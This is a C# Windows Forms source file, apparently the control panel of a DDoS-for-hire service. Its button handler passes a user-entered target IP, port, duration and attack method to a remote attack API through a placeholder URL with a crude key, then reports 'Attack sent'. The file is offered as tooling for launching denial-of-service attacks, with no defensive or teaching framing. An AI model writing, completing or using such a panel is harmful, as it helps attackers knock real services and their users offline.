using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;

namespace Ddos_Panel_For_Leak.to
{
    public partial class Form2 : Form
    {
        public Form2()
        {
            InitializeComponent();
        }

        private void siticoneHtmlLabel1_Click(object sender, EventArgs e)
        {

        }

        private void IPAddress_TextChanged(object sender, EventArgs e)
        {

        }

        private void siticoneRoundedButton1_Click(object sender, EventArgs e)
        {
            string ip = IPAddress.Text;
            string port = Port.Text;
            string time = Time.Text;
            string method = Methods.Text;

            WebClient wc = new WebClient { }; wc.DownloadString($"https://google.com/api/?key=gaybattyman&ip={ip}&port={port}&time={time}&method={method}");
            MessageBox.Show($"Attack sent to {ip} using port {port} for {time} Second/s");
        }
    }
}
